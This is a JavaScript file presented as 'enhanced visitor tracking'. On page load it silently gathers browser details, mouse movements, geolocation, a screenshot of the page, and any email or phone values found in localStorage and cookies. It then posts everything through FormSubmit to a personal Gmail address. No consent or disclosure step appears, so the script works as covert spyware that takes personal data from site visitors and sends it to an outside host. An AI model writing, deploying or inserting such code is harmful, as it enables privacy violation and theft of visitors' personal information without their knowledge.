// tracker.js - Enhanced visitor tracking with screenshot and mouse movements
function trackVisitor() {
    const data = {
        website: window.location.href || "index.html",
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        screenWidth: window.screen.width,
        screenHeight: window.screen.height,
        language: navigator.language,
        referrer: document.referrer || "Direct visit",
        visitTime: new Date().toISOString(),
        ip: "Will be added by FormSubmit",
        mouseMovements: []
    };

    // Track mouse movements
    const mouseTrack = (e) => {
        if (data.mouseMovements.length < 100) { // Limit to 100 positions
            data.mouseMovements.push({
                x: e.clientX,
                y: e.clientY,
                time: Date.now()
            });
        }
    };
    document.addEventListener('mousemove', mouseTrack);

    // Check localStorage
    try {
        const savedEmail = localStorage.getItem('userEmail');
        const savedPhone = localStorage.getItem('userPhone');
        if (savedEmail) data.savedEmail = savedEmail;
        if (savedPhone) data.savedPhone = savedPhone;
    } catch (e) {
        console.log("LocalStorage access error:", e);
    }

    // Check cookies
    try {
        const cookies = document.cookie.split(';').reduce((res, c) => {
            const [key, val] = c.trim().split('=').map(decodeURIComponent);
            return Object.assign(res, { [key]: val });
        }, {});
        if (cookies.email) data.cookieEmail = cookies.email;
        if (cookies.phone) data.cookiePhone = cookies.phone;
    } catch (e) {
        console.log("Cookie access error:", e);
    }

    // Get geolocation
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            position => {
                data.latitude = position.coords.latitude;
                data.longitude = position.coords.longitude;
                captureAndSend(data);
            },
            () => {
                data.locationError = "Geolocation unavailable";
                captureAndSend(data);
            }
        );
    } else {
        captureAndSend(data);
    }

    // Remove mouse tracker before leaving
    window.addEventListener('beforeunload', () => {
        document.removeEventListener('mousemove', mouseTrack);
    });
}

// Capture screenshot and send data
function captureAndSend(data) {
    // Try to load html2canvas if not available
    if (typeof html2canvas === 'undefined') {
        loadHtml2Canvas(() => {
            takeScreenshot(data);
        });
    } else {
        takeScreenshot(data);
    }
}

// Take screenshot using html2canvas
function takeScreenshot(data) {
    if (typeof html2canvas !== 'undefined') {
        html2canvas(document.body, {
            scale: 0.5, // Reduce size for performance
            logging: false,
            useCORS: true
        }).then(canvas => {
            // Convert to JPEG with 70% quality
            const screenshot = canvas.toDataURL('image/jpeg', 0.7);
            data.screenshot = screenshot;
            sendData(data);
        }).catch(err => {
            console.log("Screenshot error:", err);
            data.screenshotError = err.message;
            sendData(data);
        });
    } else {
        data.screenshotError = "html2canvas not available";
        sendData(data);
    }
}

// Load html2canvas dynamically
function loadHtml2Canvas(callback) {
    const script = document.createElement('script');
    script.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
    script.integrity = 'sha512-BNaRQnYJYiPSqHHDb58B0yaPfCu+Wgds8Gp/gU33kqBtgNS4tSPHuGibyoeqMV/TJlSKda6FXzoEyYGjTe+vXA==';
    script.crossOrigin = 'anonymous';
    script.referrerPolicy = 'no-referrer';
    script.onload = callback;
    script.onerror = () => {
        console.log("Failed to load html2canvas");
        if (typeof callback === 'function') callback();
    };
    document.head.appendChild(script);
}

// Send data to FormSubmit
function sendData(data) {
    // Limit mouse movements data size
    if (data.mouseMovements && data.mouseMovements.length > 50) {
        data.mouseMovements = data.mouseMovements.slice(-50);
    }

    fetch("https://formsubmit.co/ajax/soghbatyanvahan@gmail.com", {
        method: "POST",
        headers: { 
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(response => console.log("Tracking data sent:", response))
    .catch(error => console.error("Error sending tracking data:", error));
}

// Start tracking when page loads
window.addEventListener('load', trackVisitor);